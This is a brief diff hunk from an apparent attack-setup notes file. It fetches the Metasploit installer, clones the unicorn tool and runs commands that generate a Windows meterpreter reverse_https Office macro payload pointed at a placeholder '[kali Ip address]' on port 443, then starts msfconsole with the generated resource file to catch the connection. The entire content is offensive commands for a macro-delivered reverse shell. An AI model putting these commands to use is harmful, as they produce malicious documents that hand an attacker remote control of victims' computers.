@@ -11,7 +11,8 @@ curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/m
 
 
 git clone https://github.com/trustedsec/unicorn
-python unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
+chmod +x unicorn
+python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
 sudo msfconsole -r unicorn.rc
 
 ---------
